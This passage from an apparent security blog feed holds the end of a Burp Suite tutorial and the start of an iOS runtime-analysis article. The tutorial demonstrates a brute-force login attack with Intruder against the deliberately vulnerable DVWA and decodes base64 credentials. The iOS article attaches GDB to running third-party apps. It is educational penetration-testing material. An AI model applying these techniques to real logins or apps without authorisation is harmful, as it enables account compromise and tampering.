&lt;p&gt;&lt;strong&gt;3) Scanner&lt;/strong&gt; - It is used to scan web applications for vulnerabilities. The type of scanning can be passive, active or user-directed. Some false positives might occur during the tests. It is important to remember that no automated scanner is 100 percent accurate in its results. Unfortunately Burp Scanner is not available with the Free edition that is included in Backtrack 5.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4) Intruder&lt;/strong&gt; - This feature can be used for various purposes like exploiting vulnerabilities, fuzzing web applications, carrying out brute force attacks etc.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5) Repeater&lt;/strong&gt; - This feature is used to modify and send the same request a number of times and analyze the responses in all those different cases.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6) Sequencer&lt;/strong&gt; - This feature is mainly used to check the randomness of Session tokens provided by the web application. It performs various advanced tests to figure this out.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;7) Decoder&lt;/strong&gt; - This feature can be used to decode data to get back the original form, or to encode and encrypt data.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;8) Comparer&lt;/strong&gt; - This feature is used to perform a comparison between any two requests, responses or any other form of data. This feature could be useful when comparing the responses with different inputs.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1) Proxy&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The proxy feature allows us to intercept and modify requests. In order to intercept the requests and manipulate them, we must configure our browser to direct its traffic through Burp’s proxy, which is 127.0.0.1:8080 by default.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, open up Burpsuite, go to Proxy–&amp;gt;Intercept and make sure Intercept is on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go to the alerts tab, we can see that a proxy service is running on port 8080. We can also change this configuration by going to the options tab under proxy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s have a look at all the options we have while running the proxy, go to the options tab under proxy&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we can edit the port the proxy is listening on, and even add a new proxy listener. Burp also has option of presenting certificates to SSL protected websites. By default, Burp creates a self signed CA certificate upon installation. The current checked option, i.e &lt;em&gt;generate CA-signed per-host certificates&lt;/em&gt; will generate a certificate for the particular host we are connecting to signed by Burp’s CA certificate. The only thing with which we are concerned here is to decrease the number of warnings which a user gets when connecting to a SSL protected website.&lt;/p&gt;

&lt;p&gt;If we don’t check the &lt;em&gt;listen in loopback interface only&lt;/em&gt; option then this means that the burp proxy can serve as a proxy for other systems on the network too. This means any computer in the same network can use this Burp proxy as a proxy and relay its traffic through it.&lt;/p&gt;

&lt;p&gt;The &lt;em&gt;support invisible proxying for non-proxy-aware client&lt;/em&gt; option is used for clients that do not know that they are using a proxy. This means that the option for proxy is not set in the browser, but somewhere else, for e.g in the hosts.txt file. The only issue with this is that the request in this case will be a bit different than the requests when the proxy option is set in the browser itself, and hence Burp needs to know if it is receiving traffic from a non-proxy aware client. The &lt;em&gt;redirect to host, redirect to port&lt;/em&gt; option will redirect the client to the host and port we specify in that option.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly we can intercept requests and responses based on the rules we specify here. This could be a handy feature when we want to intercept only some of the requests in a very high traffic environment.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There are options for modifying HTML received from the response. We can unhide hidden form fields, remove javascript etc. Similarly there is an option for finding a specific pattern and replacing it with a custom string. We need to specify regular expressions here. Burp will parse the request or response looking for this pattern and will replace it with the custom string.&lt;/p&gt;

&lt;p&gt;Now that we have set up Burpsuite and the configurations in our browser properly, we can intercept requests. Please note that whenever we send a request, it will be intercepted by Burpsuite and we will have to forward it manually. Hence it is advisable to keep “intercept is on” option checked only when you really want to see the contents of the packets going through.&lt;/p&gt;

&lt;p&gt;Open up your browser and start browsing. We will see that the request is being intercepted by Burpsuite. Hence our proxy is working fine, we can right click on it and send the request to various other tools in Burpsuite for analysis.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2) Spider&lt;/strong&gt; - Burp Spider is used for mapping web application. It will automatically crawl the web application, looking for links, will submit any login forms it finds and hence provide a detailed analysis of the whole application. These links can then be passed over to Burp Scanner to perform a detailed scan using the information provided by the scanner. In this case i will be using the spider tool on DVWA (Damn vulnerable Web Application). To do that simply go to the application DVWA using your browser, make sure intercept is on in Burpsuite, and get the request intercepted by Burpsuite. Right click on the intercepted request, and click on &lt;em&gt;send to spider&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once you do this, an alert will pop up asking us to add the item to the scope. Click on &lt;em&gt;Yes&lt;/em&gt;. A scope basically defines the target region on which we want to run our tests.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we go to the &lt;em&gt;target&lt;/em&gt; tab under &lt;em&gt;site map&lt;/em&gt;, we will see that the url has been added in the target. Also we can see that some other targets like http://google.com have been added to the targets list. Burpsuite automatically adds targets as we browse the web while using Burp’s proxy. We can add the targets to our scope by right clicking on any target and clicking on &lt;em&gt;add item to scope.&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we go to the &lt;em&gt;Scope&lt;/em&gt; tab we find that the application dvwa has been added to the scope. &lt;img src=&quot;/images/posts/burpsuite/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go to the Spider tab now and click on options. Here we can set various options while running the Burp spider on the application. We can ask it to check for robots.txt file, in which it will try to crawl to the directories that the website administrator has not allowed to be indexed for search engines. Another important option is &lt;em&gt;passively spider as you browse&lt;/em&gt;. Basically Burp Spider can be run both in passive and active mode. This asks Burp Spider to keep scanning for new links, content as we browse the web application using Burp’s proxy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another important option is &lt;em&gt;application login&lt;/em&gt;. Whenever Burp Spider hits a login form while crawling, it can automatically submit the credentials that we provide to it here. I have asked Burp Spider to submit the credentials &lt;em&gt;admin/password&lt;/em&gt; as these are the credentials used in DVWA. Hence Burp spider will submit these credentials automatically and keep crawling ahead looking for extra information. You can also change the thread count if you want.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To begin spidering an application, just right click on the target to reveal the branch for DVWA (in this case dvwa) and click on &lt;em&gt;spider this branch&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This will start the Burp Spider. If we go to the Spider control tab, we can see the requests being made. We can also define a custom scope for Burp Spider.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once it has finished running, we will see a lot of new URL’s for dvwa branch. This provides us very useful information about the web application. We can then send these URLs to other Burp tools like Burp Scanner (available only in professional edition) and scan it for vulnerabilities.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3) Intruder&lt;/strong&gt; - Burp Intruder can be used for exploiting vulnerabilities, fuzzing, carrying out brute force attacks and many other purposes. In this case we will be using the Intruder feature in Burp Suite to carry out a brute force attack against DVWA. Browse over to DVWA and click on Brute Force. Enter any username/password, make sure &lt;em&gt;Intercept is on&lt;/em&gt; in Burpsuite, and click on &lt;em&gt;Login&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The request will be intercepted by Burpsuite, right click on it and click on “send to intruder”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This will send the request information to the Intruder. Go to the &lt;em&gt;Intruder&lt;/em&gt; tab. Now we will have to configure Burpsuite to launch the brute force attack. Under the &lt;em&gt;target&lt;/em&gt; tab, we can see that it has already set the target by looking at the request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go to the positions tab now, here we can see the request which we had previously sent to intruder. Some of the things are highlighted in the request. This is basically a guess by Burpsuite to figure out what all things will be changing with each request in a Brute force attack. Since in this case only username and password will be changing with each request, we need to configure Burp accordingly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/21.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Click on the clear button on the right hand side. This will remove all the highlighted text, now we need to configure Burp to only set the username and password as the parameters for this attack. Highlight the username from this request (in this case “infosecinstitute”) and click on Add. Similarly, highlight the password from this request and click on Add. This will add the username and password as the first and second parameters. Once you are done, your output should look something like this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/22.png&quot; alt=&quot;22&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next thing we need to do is set the Attack type for this attack, which is found at the top of the request we just modified. By default it is set to Sniper. However, in our case we will be using the Attack type “Cluster Bomb”. According to &lt;a href=&quot;http://portswigger.net/burp/help/intruder.html&quot;&gt;Burp’s documentation&lt;/a&gt; from &lt;a href=&quot;http://portswigger.net/&quot;&gt;portswigger.net&lt;/a&gt; here is the difference between the different types of attack.&lt;/p&gt;

&lt;p&gt;Sniper - This uses a single set of payloads. It targets each position in turn, and inserts each payload into that position in turn. Positions which are not targeted during a given request are not affected - the position markers are removed and any text which appears between them in the template remains unchanged. This attack type is useful for testing a number of data fields individually for a common vulnerability (e.g. cross-site scripting). The total number of requests generated in the attack is the product of the number of positions and the number of payloads in the payload set.&lt;/p&gt;

&lt;p&gt;battering ram - This uses a single set of payloads. It iterates through the payloads, and inserts the same payload into all of the defined positions at once. This attack type is useful where an attack requires the same input to be inserted in multiple places within the HTTP request (e.g. a username within the Cookie header and within the message body). The total number of requests generated in the attack is the number of payloads in the payload set.&lt;/p&gt;

&lt;p&gt;pitchfork - This uses multiple payload sets. There is a different payload set for each defined position (up to a maximum of 8). The attack iterates through all payload sets simultaneously, and inserts one payload into each defined position. I.e., the first request will insert the first payload from payload set 1 into position 1 and the first payload from payload set 2 into position 2; the second request will insert the second payload from payload set 1 into position 1 and the second payload from payload set 2 into position 2, etc. This attack type is useful where an attack requires different but related input to be inserted in multiple places within the HTTP request (e.g. a username in one data field, and a known ID number corresponding to that username in another data field). The total number of requests generated by the attack is the number of payloads in the smallest payload set.&lt;/p&gt;

&lt;p&gt;cluster bomb - This uses multiple payload sets. There is a different payload set for each defined position (up to a maximum of 8). The attack iterates through each payload set in turn, so that all permutations of payload combinations are tested. I.e., if there are two payload positions, the attack will place the first payload from payload set 1 into position 1, and iterate through all the payloads in payload set 2 in position 2; it will then place the second payload from payload set 1 into position 1, and iterate through all the payloads in payload set 2 in position 2. This attack type is useful where an attack requires different and unrelated input to be inserted in multiple places within the HTTP request (e.g. a username in one parameter, and an unknown password in another parameter). The total number of requests generated by the attack is the product of the number of payloads in all defined payload sets - this may be extremely large.&lt;/p&gt;

&lt;p&gt;As we can see in the image below, our attack type is set to “Cluster Bomb”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/23.png&quot; alt=&quot;23&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go to the payload tab, make sure payload set 1 is selected, click on load and load the file containing a list of usernames. In my case I am using a very small file just for demonstrations purposes. Once you load the file all the usernames will be displayed as shown in the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/24.png&quot; alt=&quot;24&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly select payload set 2, click on load and load the file containing a list of passwords.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/25.png&quot; alt=&quot;25&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go to the options tab now and make sure “store requests” and “store response” options are set under results. Have a look at all the options and see if you need or don’t need any of these options.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/26.png&quot; alt=&quot;26&quot; /&gt;&lt;/p&gt;

&lt;p&gt;All right we are now set to launch our attack. Click on &lt;em&gt;Intruder&lt;/em&gt; on the top left and click on &lt;em&gt;start attack&lt;/em&gt;. We will see a window pop up with all the requests being made. So how do we know which request is successful ? Usually a successful request will have a different response than an unsuccessful request or will have a different status response. In this case we see that the request with the username “admin” and the password “password” has a response of different length than the other responses.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/27.png&quot; alt=&quot;27&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s click on the request with a different response size. If we click on the response section, we see the text “Welcome to the password protected area admin” in the response. This confirms that the username/password used in this request is the correct one.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/28.png&quot; alt=&quot;28&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I recommend you explore Burp Intruder in more detail as it is one of the most powerful features available in Burpsuite.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4) Repeater&lt;/strong&gt; - With Burp Repeater, we can manually modify a request, and resend it to analyze the response. We need to send a request to Burp Repeater for this. The request can be sent to it from various places like Intruder, proxy etc. Let’s send a request to Repeater from the Intruder attack we just performed on DVWA. To send the request to the Intruder, just right click on the request and click on &lt;em&gt;Send to Intruder&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/29.png&quot; alt=&quot;29&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we go to the Repeater tab, we can see the request there. We also see that there are 3 tabs with the name 1,2 and 3. In Burp Repeater, a tab is used for each request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/30.png&quot; alt=&quot;30&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also see the params, header, hex and raw format of the request. We can modify any of these before sending the request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/31.png&quot; alt=&quot;31&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s just change the username, password to the correct one, i.e username=admin and password=password and click on &lt;em&gt;Go&lt;/em&gt;. This will send the request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/32.png&quot; alt=&quot;32&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can analyze the response in the response section. Again we have the option to see the params, header, hex and raw format of the response. The render option displays the page as if it were displayed in a browser, though it is not fully reliable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/33.png&quot; alt=&quot;33&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5) Sequencer&lt;/strong&gt; - Burp Suite Sequencer is used to figure out the randomness of the Session tokens generated by a web application. This is because Session tokens are usually used to authenticate a user, and hence should not be compromised. It is important for a web application to have a high degree of randomness for Session tokens, so that brute force attacks are not successful against it. We need to send a request which returns a Session token to the sequencer, the Sequencer then repeatedly sends the request, thus obtaining a high number of Session ID’s. It then passes these Session ID’s through various statistical tests to determine the randomness.&lt;/p&gt;

&lt;p&gt;Let’s send a request that returns a session token to the Sequencer. Right click on the request and click on &lt;em&gt;Send to Sequencer&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/41.png&quot; alt=&quot;41&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In sequencer we can see that it automatically identified the ID parameter. We can also use manual selection to select it ourselves, or we can use the cookie and form field drop box to select the value which we think is the Session token.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/42.png&quot; alt=&quot;42&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Click on start capture to start the process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/43.png&quot; alt=&quot;43&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see the requests being made and the different tokens being received. It is good to have a sample size of atleast 100-200 tokens before starting the analysis. However, the more no of tokens, the better would be the test results. Once you think you have captured enough tokens, click on &lt;em&gt;Analyze now&lt;/em&gt;. We will see that Burp Sequencer is now performing all the tests.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/44.png&quot; alt=&quot;44&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The result are displayed as shown in the figure below. As we can see in the result, the overall randomness within the sample is estimated to be excellent. You can switch between tabs to see the results of different types of analyses.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/45.png&quot; alt=&quot;45&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Burp Suite will still continue to capture tokens, so that you can again perform the test once you have collected some more tokens.Examining the different types of test and how they work is beyond the scope of this article. To understand how Burp Sequencer actually works, read this &lt;a href=&quot;http://blog.portswigger.net/2008/05/burp-sequencer-101.html&quot;&gt;nice article&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6) Comparer&lt;/strong&gt; - Burp Suite Comparer tool is used to do a comparison between 2 pieces of data, which could be requests, responses etc. We must provide the Comparer tool with 2 pieces of data in order to do that. In this case we will be giving the Comparer tool a successful response and an unsuccessful response from the brute force attack against DVWA which we carried out earlier. Make sure the response tab is selected while sending it to the comparer so that we send the responses and not the requests. Right click on an unsuccessful response and click on &lt;em&gt;send to comparer&lt;/em&gt;, do the same for the successful response (which is the response for request #11 in the figure below).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/34.png&quot; alt=&quot;34&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go to the comparer tab. Here we can see the two responses which we had sent to it earlier. Click on the first response (#3) on the top half, and on the second response(#4) on the bottom half. Now the two responses have been selected to carry out a comparison between them.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/35.png&quot; alt=&quot;35&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have two ways of performing a comparison between the two responses, through words or through bytes. Click on &lt;em&gt;words&lt;/em&gt; to perform a comparison by words. The result is pretty clear. While one response has a “Username and/or password incorrect” message, the other one has a “Welcome to the password protected area admin” message.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/36.png&quot; alt=&quot;36&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly, comparing by using bytes returns the following output. By now you must have begun to understand the importance of this tool.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/37.png&quot; alt=&quot;37&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;7) Decoder&lt;/strong&gt; - Burpsuite Decoder can be used to decode encoded data to get back the canonical form, and can also be used to encode and encrypt data to get the encoded and encrypted forms. We can manually paste data into the decoder or send an encoded request to it. In this case i will be sending an HTML Basic authentication request that contains the username and password in base64 encoded form to the decoder. Right click on the request and click on &lt;em&gt;Send to Decoder&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/38.png&quot; alt=&quot;38&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Highlight the encoded form and click on &lt;em&gt;decode as&lt;/em&gt; and then click on &lt;em&gt;base64&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/39.png&quot; alt=&quot;39&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Burp Decoder decodes the base64 encoded string and gives us the username/password in plaintext.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/burpsuite/40.png&quot; alt=&quot;40&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You should check out the &lt;em&gt;Smart Decode&lt;/em&gt; feature too in burpsuite, in which Burp decoder intelligently guesses the encoding used and decodes it. Though it is not fully reliable and some mistakes might occur.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;8) Scanner&lt;/strong&gt; - Burp Scanner is one of the most powerful web application scanners. Though, like any other web application scanner, it is not perfect and some false positives may occur. Burp Scanner is not available with the free edition. You can find more information about Burp Scanner &lt;a href=&quot;http://portswigger.net/burp/scanner.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;In this article we looked at almost all the popular features of Burp Suite like proxy, scanner, sequencer, repeater, etc. The extent to which it can be helpful in Web application testing is only up to the imagination of the user which makes it a valuable tool for web application testing.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;PortSwigger Website&lt;br /&gt;
&lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;http://portswigger.net/burp/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Hacking Web Authentication - Part 1&lt;br /&gt;
&lt;a href=&quot;http://resources.infosecinstitute.com/authentication-hacking-pt1/&quot;&gt;http://resources.infosecinstitute.com/authentication-hacking-pt1/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Burp Sequencer 101&lt;br /&gt;
&lt;a href=&quot;http://blog.portswigger.net/2008/05/burp-sequencer-101.html&quot;&gt;http://blog.portswigger.net/2008/05/burp-sequencer-101.html&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Burp Scanner&lt;br /&gt;
&lt;a href=&quot;http://portswigger.net/burp/scanner.html&quot;&gt;http://portswigger.net/burp/scanner.html&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application security Part 3 - Understanding the Objective-C Runtime</title>
   <link href="https://bitbrain.github.io/2013/06/16/ios-application-security-part-3-understanding-the-objective-c-runtime.html"/>
   <updated>2013-06-16T02:59:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/16/ios-application-security-part-3-understanding-the-objective-c-runtime</id>
   <content type="html">&lt;p&gt;Almost all the native iOS applications are written in Objective-C. All these apps use Cocoa which is a library that sits on top on Objc-C and provides high level APIs that make development for Mac and iOS much easier. Cocoa also adds a runtime environment for the applications. In this article, we will focus on understanding the Objective-C runtime and all the intricate details about how the language functions internally. This will help us get a much deeper understanding of its applications to iOS application security.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&quot;objective-c-runtime&quot;&gt;Objective-C runtime&lt;/h2&gt;

&lt;p&gt;Objective-C is a runtime oriented language. Now the questions that arises is, what is a runtime language ? Well, a runtime language is a language that decides what to implement in a function and other decisions during the runtime of the applications. Is Objective-C a runtime language ? NO. It is a runtime oriented language, which means that whenever it is possible, it defers decisions from compile and link time to the time when the code in the application is actually being executed. As pointed out earlier, Cocoa provides the runtime environment needed by iOS applications. Here is a paragraph from the Apple documentation shown in the image down below which will make things absolutely clear. You can read the documentation &lt;a href=&quot;https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/ObjCRuntimeGuide/Introduction/Introduction.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios3/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s have a look now to check if the runtime library is imported in projects or not. Ideally, it should be with every iOS application. To check this, log in to your device and go to the applications directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios3/Screen Shot 2013-05-15 at 4.58.11 AM.png&quot; alt=&quot;Screen Shot 2013 05 15 At 4.58.11 AM&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now type “ls *” to get a look at the entire listing of directories.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios3/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s look at the BADLAND iOS app. Just in case some of you don’t know, BADLAND is a very popular game on iOS. Let’s go inside the Badland directory. Once you are inside the folder, go inside the BADLAND.app folder and use the &lt;em&gt;otool&lt;/em&gt; utility on the Badland binary&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios3/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can now see that it imports quite a lot of frameworks as well as libraries. The objc-runtime library is the one shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios3/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is the library that makes runtime manipulation possible in Objective-C. By default, it is included in all iOS apps. Here are the otool results for the Google Maps iOS app. As you can see, it also includes the Objective-C runtime library. &lt;img src=&quot;/images/posts/ios3/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;runtime-analysis-with-gdb&quot;&gt;Runtime Analysis with GDB&lt;/h2&gt;

&lt;p&gt;In this section, we will look at how we can observe the flow of the app using GDB. The first and foremost thing is to install a proper version of gdb. The gdb version available from the Cydia store doesn’t work properly, so make sure you get the binary from some other source. Once it is done, sftp into your device and upload the binary as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios3/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then make sure it has the appropriate permissions to run.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios3/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To hook into a running process, it is first important to make sure that the process is running. In this case, we will perform the tests on the Google Maps iOS app. So lets start the app on our device and fetch its process id. Also, make sure that the app is running in foreground. As we can see from the figure below, the process id for the Google maps app is 661. Note that the process id may be different for you.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios3/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, lets use GDB to hook into this process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios3/10.png&quot; alt=&quot;10&quot; /&gt; &lt;img src=&quot;/images/posts/ios3/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, we have successfully hooked into the process. You can ignore the warnings for now.&lt;/p&gt;

&lt;p&gt;Objective-C is based on messaging and whenever a message is being sent, the objc_msgSend() method gets called. In order to analyze the flow of the app, i am going to add a breakpoint for the most basic call, i.e objc_msgSend and print the values of $r0 and $r1. From $r0 we can find out the class on which the method is being called and $r1 can be used to find out the selector. Note that even though this may lead to too much of detail, as objc_msgSend is called everytime a message is being sent. In the coming articles, we will look at how we can use it more efficiently. So basically, whenever a breakpoint is hit, i am going to print the values of $r0 and $r1 and continue the app. Here is how it’s done.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios3/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s continue the app by typing the &lt;em&gt;c&lt;/em&gt; command. &lt;img src=&quot;/images/posts/ios3/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, this helps us a lot in analyzing the flow of the app. Again, this is just too information and may not be useful in real time analysis of applications, but this is just to show how much we can figure out about the implementation of an app.&lt;/p&gt;

&lt;h2 id=&quot;method-swizzling&quot;&gt;Method Swizzling&lt;/h2&gt;

&lt;p&gt;We already learnt that all the iOS apps use a runtime environment while execution which means that a lot of the decisions are taken at runtime. As the name suggests, method swizzling is just another weapon that we can use to our advantage for modifying the behaviour of an iOS application. It allows us to change the mapping from the selector to the implementation which we could use to our advantage and call our own methods instead. We will look into Method Swizzling in great detail in the next article.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;The Dark art of iOS Application hacking&lt;br /&gt;
